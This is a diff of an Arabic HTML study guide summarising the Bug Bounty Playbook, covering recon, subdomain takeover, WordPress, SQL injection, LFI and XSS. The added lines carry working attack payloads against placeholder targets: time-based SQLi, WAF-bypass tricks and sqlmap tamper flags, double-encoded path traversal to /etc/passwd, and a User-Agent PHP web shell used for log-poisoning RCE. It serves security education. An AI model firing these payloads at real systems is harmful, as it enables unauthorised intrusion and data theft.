@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bug Bounty Playbook — HunterOS Book Guide</title>
+  <title>Bug Bounty Playbook — HunterOS Study Guide</title>
   
   <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -104,7 +104,7 @@
     }
     .reading-grid {
       display: grid;
-      grid-template-columns: 300px 1fr;
+      grid-template-columns: 320px 1fr;
       gap: 30px;
     }
     @media (max-width: 900px) {
@@ -249,7 +249,7 @@
       padding: 0 10px;
     }
     .quiz-answer-panel.open {
-      max-height: 350px;
+      max-height: 450px;
       padding: 10px 10px;
       border-right: 2px solid #e500ff;
       margin-top: 5px;
@@ -277,11 +277,11 @@
       </div>
       <div class="book-meta-info">
         <h1 class="book-title">The Bug Bounty Playbook</h1>
-        <div class="book-author">By Alex Thomas (Ghostlulz) - شرح تفصيلي متكامل</div>
+        <div class="book-author">موسوعة التكتيكات الشاملة (المجلد الأول والثاني) — لـ Alex Thomas (Ghostlulz)</div>
         <div class="book-stats">
           <span class="stat-badge" style="color: #e500ff;">الصعوبة: متوسط إلى متقدم</span>
-          <span class="stat-badge">المدة الزمنية للفيديو: 3 ساعات وأكثر</span>
-          <span class="stat-badge">التركيز: بناء بيئة الاستطلاع والاستغلال الميداني</span>
+          <span class="stat-badge">أدوات الفحص المغطاة: 15+ أداة احترافية</span>
+          <span class="stat-badge">نوع المحتوى: مرجع استطلاع واستغلال تفصيلي</span>
         </div>
       </div>
     </header>
@@ -291,17 +291,22 @@
       
       <!-- Right Sidebar (TOC) -->
       <aside class="book-sidebar">
-        <div class="toc-title">فهرس الدليل الدراسي</div>
+        <div class="toc-title">أقسام الموسوعة المرجعية</div>
         <nav>
-          <a href="#intro" class="toc-item">1. مقدمة وهيكل الكتاب</a>
-          <a href="#pregame" class="toc-item">2. إعداد البنية التحتية (Pre-Game)</a>
-          <a href="#recon" class="toc-item">3. استراتيجية الاستطلاع والاستكشاف (Recon)</a>
-          <a href="#easywins" class="toc-item">4. صيد الأهداف سهلة المنال (Easy Wins)</a>
-          <a href="#cms" class="toc-item">5. استغلال أنظمة إدارة المحتوى (CMS)</a>
-          <a href="#owasp" class="toc-item">6. ثغرات الحقن والويب الشهيرة (OWASP)</a>
-          <a href="#advanced" class="toc-item">7. ثغرات SSRF, XXE, IDOR المتقدمة</a>
-          <a href="#reporting" class="toc-item">8. كتابة التقارير ودمج الثغرات (Chaining)</a>
-          <a href="#quizzes" class="toc-item">9. أسئلة اختبار الفهم التفاعلية</a>
+          <a href="#intro" class="toc-item">1. مقدمة وهيكل الكتابين</a>
+          <a href="#infrastructure" class="toc-item">2. المجلد 1: تجهيز البنية التحتية</a>
+          <a href="#subdomains" class="toc-item">3. المجلد 1: استكشاف النطاقات الفرعية</a>
+          <a href="#scanning" class="toc-item">4. المجلد 1: المنافذ وتحديد المكونات</a>
+          <a href="#content-discovery" class="toc-item">5. المجلد 1: البحث عن الملفات والنسخ الاحتياطية</a>
+          <a href="#takeovers" class="toc-item">6. المجلد 2: ثغرات السيطرة (Subdomain Takeovers)</a>
+          <a href="#cms-hacking" class="toc-item">7. المجلد 2: فحص واختراق الووردبريس و CMS</a>
+          <a href="#sqli" class="toc-item">8. المجلد 2: حقن قواعد البيانات وتخطي WAF</a>
+          <a href="#lfi-rfi" class="toc-item">9. المجلد 2: تضمين الملفات LFI/RFI و RCE</a>
+          <a href="#xss-csrf" class="toc-item">10. المجلد 2: ثغرات XSS (DOM & Blind) والـ CSRF</a>
+          <a href="#ssrf-xxe" class="toc-item">11. المجلد 2: ثغرات SSRF و XML Entity (XXE)</a>
+          <a href="#idor" class="toc-item">12. المجلد 2: ثغرات التحكم بالوصول IDOR</a>
+          <a href="#reporting" class="toc-item">13. المجلد 2: دمج الثغرات وكتابة التقارير الحيوية</a>
+          <a href="#quizzes" class="toc-item">14. بنك الأسئلة والاختبارات التفاعلية</a>
         </nav>
       </aside>
 
@@ -310,275 +315,400 @@
 
         <!-- Intro -->
         <section id="intro" class="content-sec">
-          <h2 class="sec-title">1. مقدمة وهيكل الكتاب</h2>
-          <p>كتاب <strong>Bug Bounty Playbook</strong> يمثل دليلاً انتقالياً رائعاً لمن يمتلك أساسيات الشبكات والويب ويريد البدء الفعلي في كسب مكافآت برامج Bug Bounty. يتميز هذا الكتاب بتركيزه التقني والتطبيقي المباشر بعيداً عن التنظير البحت، حيث يركز الكاتب <strong>Alex Thomas (Ghostlulz)</strong> على بناء خطة لعب منظمة مقسمة إلى ثلاث مراحل أساسية:</p>
-          <ol>
-            <li><strong>مرحلة التجهيز (Pre-Game):</strong> إعداد الأدوات والبيئة الخاصة بك.</li>
-            <li><strong>مرحلة جمع المعلومات (Reconnaissance):</strong> رسم الخريطة الكاملة للهدف.</li>
-            <li><strong>مرحلة استكشاف الثغرات واستغلالها (Exploitation):</strong> الهجوم الحقيقي للوصول للثغرة وإثبات الأثر.</li>
-          </ol>
+          <h2 class="sec-title">1. مقدمة وهيكل الكتابين</h2>
+          <p>كتاب **Bug Bounty Playbook** (بمجلديه الأول والثاني) يمثل أحد أبرز المراجع التقنية التطبيقية في مجتمع الأمن السيبراني. قام الكاتب **Alex Thomas (Ghostlulz)** بتقسيم العملية الأمنية إلى قسمين جوهريين:</p>
+          <ul>
+            <li><strong>المجلد الأول (Reconnaissance & Fingerprinting):</strong> يركز بشكل كامل على التجهيز والاستطلاع، وجمع أكبر قدر من المعلومات ورسم البنية الشبكية والخارجية للهدف.</li>
+            <li><strong>المجلد الثاني (Exploitation Playbook):</strong> ينتقل إلى الجانب الهجومي الحقيقي واستغلال الثغرات وتحدي أنظمة جدار الحماية (WAF) للوصول إلى ثغرات بالغة الأثر مثل الحقن والتسريب والتحكم عن بعد بالخوادم.</li>
+          </ul>
           <div class="benefit-box">
-            <strong>القيمة الجوهرية للكتاب:</strong>
-            يساعدك الكتاب على تجنب العشوائية في الفحص والتنقل بين الأنظمة، ويعطيك "كتيب إرشادات" واضحاً للتحقق من ثغرات محددة بناءً على نوع النظام والتقنية المكتشفة.
+            <strong>أهمية دراسة المجلدين معاً:</strong>
+            المجلد الأول يوفر لك الأهداف والمنافذ المنسية التي لا يفحصها أحد، بينما يمنحك المجلد الثاني التكتيكات البرمجية واليدوية لاستغلال تلك الأهداف وصناعة إثبات مفهوم قوي (PoC) يضمن لك الحصول على أعلى مكافأة مالية (Bounty).
           </div>
         </section>
 
-        <!-- Pre-Game -->
-        <section id="pregame" class="content-sec">
-          <h2 class="sec-title">2. إعداد البنية التحتية (Pre-Game)</h2>
-          <p>يركز الكاتب على أن الفشل في إعداد بيئتك بشكل احترافي سيتسبب في ضياع الكثير من الثغرات. يوصي الكتاب بالآتي:</p>
+        <!-- Infrastructure -->
+        <section id="infrastructure" class="content-sec">
+          <h2 class="sec-title">2. المجلد 1: تجهيز البنية التحتية (Pre-Game)</h2>
+          <p>يؤكد الكاتب أن صيد الثغرات بشكل احترافي يتطلب بيئة عمل مخصصة وسريعة تضمن استمرارية الفحص والتقاط الثغرات العمياء.</p>
           
-          <h3 class="sub-sec-title">أ. إعداد سيرفر VPS (Virtual Private Server)</h3>
-          <p>تشغيل سكريبتات الفحص والاستطلاع بشكل دائم (24/7) دون الاعتماد على موارد جهازك الشخصي وسرعة الإنترنت لديك. هذا يتيح لك الاستمرار في عمل Brute Forcing و DNS resolution بدون انقطاع.</p>
-          
-          <h3 class="sub-sec-title">ب. إعداد نطاق شخصي (Custom Domain)</h3>
-          <p>ضروري جداً لتلقي اتصالات الـ Out-Of-Band (مثل تفاعلات ثغرات Blind XSS أو SSRF) باستخدام أدوات مثل Interactsh أو إعداد خادم DNS خاص بك. عندما تقوم بحقن كود يستدعي خادماً خارجياً، سيتصل الخادم بالنطاق الخاص بك لتأكيد وجود الثغرة.</p>
-          
-          <h3 class="sub-sec-title">ج. تنظيم قاعدة البيانات والملفات</h3>
-          <p>تنظيم المخرجات في مجلدات مقسمة لكل هدف، وتوثيق جميع النطاقات الفرعية المكتشفة لمتابعة الفحص لاحقاً.
-          يوصي الكاتب بإنشاء هيكل مجلدات شبيه بالتالي:</p>
+          <h3 class="sub-sec-title">أ. سيرفر VPS والاستمرارية (24/7 Scanning)</h3>
+          <p>الاعتماد على جهازك الشخصي يعوقك عن تشغيل الفحوصات الطويلة. يوصي الكاتب باستئجار خادم افتراضي خاص (VPS) مثل Linode أو DigitalOcean وتنصيب أدوات الاستطلاع عليه. لتجنب فقدان الجلسة عند إغلاق الجهاز، ينصح باستخدام أدوات إدارة النوافذ مثل <code>screen</code> أو <code>tmux</code>:</p>
           <div class="code-box">
-~/bugbounty/
-  ├── target_name/
-  │    ├── recon/
-  │    │    ├── subdomains.txt
-  │    │    ├── alive.txt
-  │    │    └── ports.txt
-  │    └── vulns/
+# بدء جلسة فحص مستمرة في الخلفية
+tmux new -s recon_session
+# تشغيل أداة الفحص
+./my_recon_script.sh
+# للخروج من الجلسة مع بقائها تعمل: اضغط Ctrl+B ثم D
+# للعودة للجلسة لاحقاً:
+tmux attach -t recon_session
+          </div>
+
+          <h3 class="sub-sec-title">ب. إعداد خادم ونطاق الاستماع المخصص (OOB Setup)</h3>
+          <p>لاكتشاف الثغرات العمياء (Blind Vulnerabilities)، تحتاج إلى تلقي اتصالات الراجع. يتم شراء نطاق مخصص (مثل `hunter-oob.com`) وتوجيه سجلات الـ Nameservers الخاصة به إلى سيرفر الـ VPS الخاص بك.
+          يتم تنصيب خادم تفاعلي مثل <code>interactsh-server</code> أو <code>acme-dns</code> لالتقاط طلبات الـ DNS والـ HTTP والـ LDAP المرسلة من السيرفرات المصابة.</p>
+        </section>
+
+        <!-- Subdomains -->
+        <section id="subdomains" class="content-sec">
+          <h2 class="sec-title">3. المجلد 1: استكشاف النطاقات الفرعية (Subdomain Enumeration)</h2>
+          <p>يعتبر الكاتب عملية جمع النطاقات الفرعية هي النواة الأساسية لاكتشاف الثغرات. يتم الفحص عبر دمج آليات عديدة لضمان جمع كل نطاق ممكن.</p>
+          
+          <h3 class="sub-sec-title">أ. جمع النطاقات بالطرق السلبية (Passive Discovery)</h3>
+          <p>الاستعلام من قواعد البيانات المفتوحة وشهادات SSL المؤرشفة. الأدوات الأساسية:</p>
+          <div class="code-box">
+# جمع سلبي مدمج باستخدام مفاتيح API للأدوات الشهيرة
+subfinder -d target.com -all -recursive -o passive_subs.txt
+amass enum -passive -d target.com -o amass_subs.txt
+          </div>
+
+          <h3 class="sub-sec-title">ب. تخمين النطاقات بالطرق النشطة (Active Brute Forcing)</h3>
+          <p>تخمين النطاقات بتوليد تركيبات أسماء ومقارنتها عبر خوادم DNS. يوصي الكاتب بفلترة قائمة خوادم الـ DNS أولاً لمنع النتائج الإيجابية الخاطئة (Wildcard DNS) باستخدام سكريبتات الفحص المسبق مثل `dnsvalidator`، ثم التخمين عالي السرعة:</p>
+          <div class="code-box">
+# التخمين النشط باستخدام محللات DNS نظيفة
+puredns bruteforce wordlist.txt target.com -r trusted_resolvers.txt -o active_subs.txt
+          </div>
+
+          <h3 class="sub-sec-title">ج. توليد التبديلات والتعديلات (Subdomain Permutations)</h3>
+          <p>صنع تنويعات من الأسماء المكتشفة للتخمين (مثل إضافة staging- أو -dev أو -test):</p>
+          <div class="code-box">
+# توليد تنويعات وتخمينها مباشرة
+goaltdns -l subs.txt -w words.txt -o perm_subs.txt
+puredns resolve perm_subs.txt -r resolvers.txt -o valid_perms.txt
           </div>
         </section>
 
-        <!-- Recon -->
-        <section id="recon" class="content-sec">
-          <h2 class="sec-title">3. استراتيجية الاستطلاع والاستكشاف (Recon)</h2>
-          <p>عملية جمع المعلومات هي المفتاح الأساسي. كلما جمعت معلومات أكثر عن الهدف، زادت مساحة الهجوم المتاحة وازدادت فرصك في العثور على ثغرات فريدة.</p>
+        <!-- Port Scanning & Fingerprinting -->
+        <section id="scanning" class="content-sec">
+          <h2 class="sec-title">4. المجلد 1: المنافذ وتحديد المكونات (Fingerprinting)</h2>
+          <p>بمجرد اكتمال قائمة النطاقات الفرعية، يجب معرفة من منها يقدم خدمات حقيقية وما هي هذه الخدمات.</p>
           
-          <h3 class="sub-sec-title">أ. جمع النطاقات الفرعية (Subdomain Enumeration)</h3>
-          <p>الجمع يعتمد على الدمج بين الاستطلاع السلبي (Passive Recon) والاستطلاع النشط (Active Recon):</p>
+          <h3 class="sub-sec-title">أ. كشف النطاقات المستجيبة (Web Probing)</h3>
+          <p>تصفية النطاقات التي تفتح منافذ ويب فعالة (80/443) واستخراج المعلومات الأساسية كأكواد الاستجابة وطول الصفحة:</p>
+          <div class="code-box">
+cat all_subdomains.txt | httpx -sc -cl -title -td -o web_targets.txt
+          </div>
+
+          <h3 class="sub-sec-title">ب. فحص المنافذ بمقاييس ضخمة (Port Scanning at Scale)</h3>
+          <p>استخدام أداة فائقة السرعة مثل <code>masscan</code> لفحص آلاف الخوادم والـ IPs المكتشفة، تليها أداة <code>nmap</code> لفحص تفصيلي للمنافذ المفتوحة فقط لتوفير الوقت:</p>
+          <div class="code-box">
+# فحص سريع لجميع المنافذ بمعدل 1000 حزمة في الثانية
+masscan -iL ip_list.txt -p1-65535 --rate 1000 -oG masscan_raw.txt
+# تمرير المنافذ المفتوحة لنظام Nmap لفحص الإصدارات والـ Scripts التلقائية
+nmap -sV -sC -p [ports_discovered] -iL ip_list.txt -oA nmap_detailed
+          </div>
+
+          <h3 class="sub-sec-title">ج. التعرف على التقنيات (Technology Profiling)</h3>
+          <p>استخدام أدوات الفحص البرمجي للتعرف على التقنيات المستخدمة خلف الكواليس (مثل إصدارات PHP أو IIS أو CMS أو مكتبات جافا سكريبت) لمعرفة ما إذا كانت تحتوي على ثغرات معروفة (CVEs):</p>
+          <div class="code-box">
+whatweb -i web_targets.txt --aggression 3 -oG tech_profiles.txt
+          </div>
+        </section>
+
+        <!-- Content Discovery -->
+        <section id="content-discovery" class="content-sec">
+          <h2 class="sec-title">5. المجلد 1: البحث عن الملفات والنسخ الاحتياطية</h2>
+          <p>تعتبر ملفات النسخ الاحتياطي ومجلدات التكوين المنسية أسرع طريق لاختراق خوادم الويب بالكامل.</p>
+          
+          <h3 class="sub-sec-title">أ. فحص المسارات الحساسة (Directory & File Fuzzing)</h3>
+          <p>البحث عن مسارات غير معلنة للمستخدمين. يوصي الكاتب باستخدام أداة `ffuf` مع قائمة كلمات مدروسة ومكثفة (مثل قوائم `SecLists` المخصصة للـ Discovery) وتحديد امتدادات الملفات المناسبة للهدف:</p>
+          <div class="code-box">
+ffuf -w directory_list.txt -u https://target.com/FUZZ -e .php,.asp,.html,.xml,.json,.txt -mc 200,301,302,403
+          </div>
+
+          <h3 class="sub-sec-title">ب. صيد ملفات التكوين والمجلدات المصدرية المنسية</h3>
+          <p>ابحث دائماً عن الملفات التالية:</p>
           <ul>
-            <li><strong>الاستطلاع السلبي (Passive):</strong> الاستعلام من قواعد البيانات والشهادات المؤرشفة دون إرسال أي حزم مباشرة للهدف.
-              <div class="code-box">
-subfinder -d target.com -all -o passive_subs.txt
-              </div>
-            </li>
-            <li><strong>الاستطلاع النشط (Active Brute Forcing):</strong> تخمين النطاقات الفرعية باستخدام قواميس كلمات ضخمة ومحللات DNS سريعة:
-              <div class="code-box">
-puredns bruteforce wordlist.txt target.com -r resolvers.txt -o active_subs.txt
-              </div>
-            </li>
+            <li>مجلدات التكوين البرمجي المفتوحة بالخطأ: <code>.git/</code>, <code>.env</code>, <code>.svn/</code>, <code>.hg/</code></li>
+            <li>ملفات النسخ الاحتياطي للموقع والبيانات: <code>backup.zip</code>, <code>config.php.bak</code>, <code>db.sql</code>, <code>project.tgz</code></li>
+            <li>ملفات إدارة الحزم والتنزيلات: <code>composer.json</code>, <code>package.json</code>, <code>Dockerfile</code></li>
           </ul>
-
-          <h3 class="sub-sec-title">ب. كشف المنافذ والخدمات (Port Scanning & Web Server Verification)</h3>
-          <p>بعد تجميع النطاقات الفرعية وتنظيفها من التكرار، يتم فلترتها لمعرفة النطاقات النشطة التي تقدم خدمات ويب فعلاً:</p>
-          <div class="code-box">
-cat subs.txt | httpx -title -status-code -content-length -o alive.txt
-          </div>
-          <p>ثم فحص المنافذ المفتوحة الأخرى للبحث عن خدمات غير محمية مثل FTP, SSH, Database, or Jenkins:</p>
-          <div class="code-box">
-nmap -sV -sC -p- -T4 -iL alive.txt -oA nmap_results
-          </div>
-
-          <h3 class="sub-sec-title">ج. فحص المسارات والمجلدات (Directory Brute Forcing)</h3>
-          <p>البحث عن الملفات الحساسة والمنسية (مثل ملفات النسخ الاحتياطي `.bak`, `.conf`, ملفات التكوين `.git`, `.env`). استخدام أداة سريعة مثل `ffuf`:</p>
-          <div class="code-box">
-ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,403 -e .bak,.zip,.git,.env
-          </div>
-        </section>
-
-        <!-- Easy Wins -->
-        <section id="easywins" class="content-sec">
-          <h2 class="sec-title">4. صيد الأهداف سهلة المنال (Easy Wins)</h2>
-          <p>ثغرات لا تتطلب كتابة كود معقد ولكنها بالغة الخطورة وتكتشف سريعاً بمجرد انتهاء الاستطلاع.</p>
-          
-          <h3 class="sub-sec-title">أ. ثغرات السيطرة على النطاقات الفرعية (Subdomain Takeover)</h3>
-          <p>تحدث عندما يشير سجل CNAME لنطاق فرعي لخدمة خارجية (مثل AWS S3, GitHub Pages, Heroku, Shopify) ولكن هذه الخدمة تم حذفها أو لم يتم حجزها بالخدمة. يمكن للمهاجم حجز هذا الاسم في الخدمة الخارجية لصالحه ليعرض محتوى خبيث تحت اسم النطاق الأصلي للشركة!</p>
-          
           <div class="key-point">
-            <strong>بصمات الخدمات الشهيرة (Fingerprints):</strong>
-            <ul>
-              <li><strong>GitHub Pages:</strong> 404 Not Found / "There isn't a GitHub Pages site here."</li>
-              <li><strong>AWS S3:</strong> NoSuchBucket / "The specified bucket does not exist."</li>
-              <li><strong>Heroku:</strong> "There's nothing here, yet."</li>
-            </ul>
-          </div>
-          
-          <p>أداة التحقق التلقائي السريع:</p>
-          <div class="code-box">
-subjack -w subs.txt -t 100 -timeout 30 -o takeovers.txt -ssl
+            <strong>فحص مجلدات الـ Git المفتوحة:</strong> إذا وجد سكريبت الاستطلاع مسار <code>.git/</code> مفتوحاً، استخدم أداة مثل <code>git-dumper</code> لسحب المجلد بالكامل واستعادة الكود المصدري للموقع لقراءته وتحليله محلياً!
           </div>
         </section>
 
-        <!-- CMS -->
-        <section id="cms" class="content-sec">
-          <h2 class="sec-title">5. استغلال أنظمة إدارة المحتوى (CMS)</h2>
-          <p>الكثير من الشركات تستخدم أنظمة إدارة المحتوى كواجهة لمدوناتها أو مواقعها التعريفية. الأنظمة القديمة أو المكونات الإضافية (Plugins) غير المحدثة هي مناجم ذهب للهكرز.</p>
+        <!-- Takeovers -->
+        <section id="takeovers" class="content-sec">
+          <h2 class="sec-title">6. المجلد 2: ثغرات السيطرة (Subdomain Takeovers)</h2>
+          <p>تعتبر من أسهل الثغرات وتحدث نتيجة إهمال في سجلات DNS للنطاق.</p>
           
-          <h3 class="sub-sec-title">أ. فحص الووردبريس (WordPress Pentesting)</h3>
-          <p>البحث عن المكونات الإضافية الضعيفة وحقن الملفات وتسريب المستخدمين:</p>
-          <div class="code-box">
-wpscan --url https://target.com --enumerate vp,vt,u --api-token YOUR_WPSEC_TOKEN
-          </div>
-          <p>يركز الكتاب على التحقق من ملفات التثبيت المنسية (مثل <code>wp-config.php.bak</code>) أو فحص واجهات الـ APIs الحساسة للووردبريس مثل <code>/wp-json/wp/v2/users</code> لتسريب أسماء المستخدمين.</p>
-        </section>
+          <h3 class="sub-sec-title">أ. فهم آلية استغلال CNAME dangling records</h3>
+          <p>عندما تطلب شركة خدمة سحابية خارجية (مثل خوادم AWS S3)، تقوم بإنشاء سجل CNAME يشير من نطاقها الفرعي `test.target.com` إلى رابط السحابة `mybucket.s3.amazonaws.com`.
+          إذا قامت الشركة بإلغاء حسابها على Amazon أو حذف الـ Bucket دون تحديث سجلات الـ DNS وحذف CNAME، يظل النطاق الفرعي يشير إلى مكان فارغ في Amazon.
+          يمكن للمهاجم ببساطة إنشاء حساب على Amazon وحجز Bucket بنفس الاسم (`mybucket`) ليعرض أكواده الخبيثة مباشرة على النطاق الفرعي للشركة.</p>
 
-        <!-- OWASP -->
-        <section id="owasp" class="content-sec">
-          <h2 class="sec-title">6. ثغرات الحقن والويب الشهيرة (OWASP)</h2>
-          <p>الشرح التقني التفصيلي للثغرات البرمجية في منطق التطبيق وكيفية العثور عليها يدوياً.</p>
-          
-          <h3 class="sub-sec-title">أ. حقن الاستعلامات (SQL Injection - SQLi)</h3>
-          <p>التلاعب بالمدخلات لتنفيذ أوامر بقاعدة البيانات.
-          ينقسم الحقن إلى:</p>
+          <h3 class="sub-sec-title">ب. قائمة بأبرز الخدمات وبصمات الأخطاء الخاصة بها</h3>
           <ul>
-            <li><strong>Union-Based:</strong> استخراج البيانات مباشرة بدمج استعلام المهاجم مع استعلام الموقع الأصلي باستخدام كلمة `UNION`.</li>
-            <li><strong>Blind SQLi:</strong> عندما لا تظهر البيانات مباشرة، نستخدم الحقن الزمني (Time-Based) أو المنطقي (Boolean-based):
+            <li><strong>GitHub Pages:</strong> تظهر خطأ: <code>There isn't a GitHub Pages site here.</code></li>
+            <li><strong>Amazon S3:</strong> تظهر خطأ: <code>NoSuchBucket - The specified bucket does not exist.</code></li>
+            <li><strong>Heroku:</strong> تظهر خطأ: <code>There's nothing here, yet.</code></li>
+            <li><strong>Shopify:</strong> تظهر خطأ: <code>Sorry, this shop is currently unavailable.</code></li>
+          </ul>
+          <p>للفحص التلقائي السريع لمئات النطاقات:</p>
+          <div class="code-box">
+subjack -w subs.txt -t 100 -o takeovers_output.txt -ssl -c fingerprints.json
+          </div>
+        </section>
+
+        <!-- CMS Hacking -->
+        <section id="cms-hacking" class="content-sec">
+          <h2 class="sec-title">7. المجلد 2: فحص واختراق الووردبريس و CMS</h2>
+          <p>شرح لكيفية فحص واكتشاف ثغرات أنظمة إدارة المحتوى الشائعة.</p>
+          
+          <h3 class="sub-sec-title">أ. فحص الووردبريس الاحترافي</h3>
+          <p>يتعدى الأمر مجرد البحث عن ثغرات عامة؛ يوصي الكاتب بتنفيذ فحص أمني دقيق للـ Plugins والـ Themes وتسريب أسماء المستخدمين:</p>
+          <div class="code-box">
+wpscan --url https://wp-target.com --enumerate vp,vt,u --api-token YOUR_API_TOKEN
+          </div>
+          <p><strong>تكتيكات إضافية لووردبريس:</strong></p>
+          <ul>
+            <li>التحقق من ملفات التكوين المتروكة: <code>wp-config.php.bak</code> أو <code>wp-config.old</code></li>
+            <li>استغلال واجهة الـ API العامة لتجميع اليوزرات: <code>/wp-json/wp/v2/users</code></li>
+            <li>استغلال الـ <strong>XML-RPC:</strong> إرسال طلبات فحص تخميني لكلمات المرور مجمعة في طلب واحد (Multicall) لتجاوز حمايات الحظر (Brute-force bypass).</li>
+          </ul>
+        </section>
+
+        <!-- SQL Injection -->
+        <section id="sqli" class="content-sec">
+          <h2 class="sec-title">8. المجلد 2: حقن قواعد البيانات وتخطي WAF (SQLi)</h2>
+          <p>تعد ثغرات SQLi من الثغرات ذات الأثر البالغ لأنها تسمح للمخترق بقراءة وتعديل قاعدة البيانات بالكامل.</p>
+          
+          <h3 class="sub-sec-title">أ. فحص الثغرة يدوياً (Manual Discovery)</h3>
+          <p>ابدأ دائماً بإرسال علامات الاقتباس الفردية والمزدوجة <code>'</code> أو <code>"</code> أو اختبارات المنطق الحسابية للتحقق من اضطراب استجابة الصفحة أو ظهور أخطاء SQL:</p>
+          <div class="code-box">
+http://target.com/item.php?id=1'
+http://target.com/item.php?id=2-1 (إذا أعطت محتوى id=1 فالصفحة مصابة بحقن رقمي)
+          </div>
+
+          <h3 class="sub-sec-title">ب. استغلال ثغرات الحقن الأعمى (Blind SQLi Exploitation)</h3>
+          <p>إذا كانت استجابة الصفحة ثابتة ولا تعرض أخطاء، يتم اللجوء إلى فحص الحقن الزمني (Time-Based) أو الحقن المنطقي (Boolean-Based):</p>
+          <div class="code-box">
+# فحص حقن زمني في قاعدة بيانات MySQL
+http://target.com/item.php?id=1 AND IF(1=1, SLEEP(5), 0)
+          </div>
+
+          <h3 class="sub-sec-title">ج. تخطي حمايات جدار الحماية (WAF Bypass)</h3>
+          <p>يوصي الكاتب باستخدام آليات التشويش والتغيير (Obfuscation) لتفادي الفلاتر التقليدية:</p>
+          <ul>
+            <li>تغيير حالة الأحرف: <code>sElEcT</code> بدلاً من <code>SELECT</code></li>
+            <li>استخدام تعليقات SQL المضمنة: <code>/*!50000SELECT*/</code></li>
+            <li>استخدام الترميز الست عشري أو ترميز الـ URL المزدوج لتمرير الكلمات المفتاحية المحظورة.</li>
+            <li>استخدام نصوص تعديل المعاملات المدمجة في sqlmap (Tamper Scripts):</li>
+          </ul>
+          <div class="code-box">
+sqlmap -u "http://target.com/item.php?id=1" --tamper=space2comment,charencode --random-agent --dbms=mysql
+          </div>
+        </section>
+
+        <!-- LFI / RFI -->
+        <section id="lfi-rfi" class="content-sec">
+          <h2 class="sec-title">9. المجلد 2: تضمين الملفات LFI/RFI و RCE</h2>
+          <p>كيفية الانتقال من قراءة ملفات السيرفر الداخلية إلى تنفيذ أوامر نظام التشغيل بالكامل.</p>
+          
+          <h3 class="sub-sec-title">أ. ممرات المسار وتخطي الفلاتر (LFI Filters Bypass)</h3>
+          <p>الوصول لملفات النظام في لينكس أو ويندوز:</p>
+          <div class="code-box">
+http://target.com/read.php?file=../../../../etc/passwd
+# تجاوز حظر الفلاتر بالترميز المزدوج
+http://target.com/read.php?file=%252e%252e%252f%252e%252e%252fetc/passwd
+          </div>
+
+          <h3 class="sub-sec-title">ب. استخدام PHP Wrappers</h3>
+          <p>استخراج ملفات الكود المصدري للموقع بشكل كامل بدلاً من تشغيلها على السيرفر:</p>
+          <div class="code-box">
+http://target.com/read.php?file=php://filter/read=convert.base64-encode/resource=config.php
+          </div>
+
+          <h3 class="sub-sec-title">ج. الوصول للتحكم الكامل (LFI to RCE)</h3>
+          <ul>
+            <li><strong>تسميم سجلات الخادم (Log Poisoning):</strong> حقن كود PHP خبيث داخل ترويسة الـ User-Agent عند الاتصال بالخادم، ثم استدعاء ملف سجلات الوصول الخاصة بأباتشي أو SSH لتنفيذ الكود:
               <div class="code-box">
-# حقن زمني في قاعدة بيانات MySQL
-http://target.com/product.php?id=1 AND SLEEP(5)
+# حقن كود PHP في الـ User-Agent
+User-Agent: <?php system($_GET['cmd']); ?>
+# ثم استدعاء السجل عبر ثغرة LFI لتنفيذ الأمر
+http://target.com/read.php?file=../../../../var/log/apache2/access.log&cmd=whoami
               </div>
             </li>
+            <li><strong>استغلال ملفات الجلسة (Session Poisoning):</strong> حقن بايلود PHP خبيث داخل متغيرات الجلسة، ثم استدعاء ملف الجلسة المخزن على السيرفر مثل <code>/var/lib/php/sessions/sess_SESSIONID</code>.</li>
           </ul>
-          <p>يوضح الكتاب كيفية التحقق اليدوي البسيط قبل استخدام `sqlmap` لتجنب كشف فحصك بواسطة الـ WAF (جدار الحماية):</p>
-          <div class="code-box">
-sqlmap -u "http://target.com/product.php?id=1" --batch --random-agent --dbms=mysql --level=3
-          </div>
-
-          <h3 class="sub-sec-title">ب. تضمين الملفات المحلية (Local File Inclusion - LFI)</h3>
-          <p>قراءة ملفات السيرفر الداخلية الحساسة. يشرح الكتاب كيفية استخدام ممرات المسار لتخطي الفلاتر:</p>
-          <div class="code-box">
-# فلاتر وتجاوزات قراءة الملفات في خادم لينكس
-http://target.com/view.php?file=../../../../etc/passwd
-http://target.com/view.php?file=....//....//....//etc/passwd
-          </div>
-          <p>استخدام مغلفات بي إتش بي لقراءة السورس كود مشفراً بقاعدة Base64:</p>
-          <div class="code-box">
-http://target.com/view.php?file=php://filter/read=convert.base64-encode/resource=config.php
-          </div>
-
-          <h3 class="sub-sec-title">ج. ثغرات الـ XSS (Cross-Site Scripting)</h3>
-          <p>حقن جافا سكريبت لتنفيذها في متصفح الضحية.
-          يركز الكتاب على <strong>Blind XSS</strong>، وهي ثغرات XSS مخزنة ولكن لا يتم تنفيذها إلا في لوحات الإدارة الخلفية (Admin Panel). يوصي باستخدام XSS Hunter لتوليد البايلودز وتلقي التنبيهات مع لقطة شاشة للوحة الإدارة بمجرد تفعيل الثغرة.</p>
         </section>
 
-        <!-- Advanced -->
-        <section id="advanced" class="content-sec">
-          <h2 class="sec-title">7. ثغرات SSRF, XXE, IDOR المتقدمة</h2>
-          <p>ثغرات معقدة برمجياً ولكن أثرها بالغ جداً على خوادم الشركات ومواردها الداخلية.</p>
+        <!-- XSS / CSRF -->
+        <section id="xss-csrf" class="content-sec">
+          <h2 class="sec-title">10. المجلد 2: ثغرات XSS (DOM & Blind) والـ CSRF</h2>
+          <p>استهداف متصفح الضحية وسرقة جلساته وتغيير بيانات حسابه.</p>
           
-          <h3 class="sub-sec-title">أ. تزييف الطلبات من جهة الخادم (SSRF)</h3>
-          <p>إجبار السيرفر على إرسال طلبات بالنيابة عن المهاجم للوصول لخدمات داخلية بالشبكة.
-          الهدف الأكبر في بيئات السحاب (Cloud Apps) هو الوصول لبيانات المثيل (Metadata Endpoints):</p>
+          <h3 class="sub-sec-title">أ. ثغرات DOM-based XSS</h3>
+          <p>تحدث بالكامل في جهة العميل (Client-Side). يجب تحليل كود الجافا سكريبت للبحث عن المصادر (Sources) والمصبات (Sinks):</p>
+          <ul>
+            <li>المصادر (Sources): <code>location.search</code>, <code>location.hash</code>, <code>document.referrer</code></li>
+            <li>المصبات (Sinks): <code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code></li>
+          </ul>
+
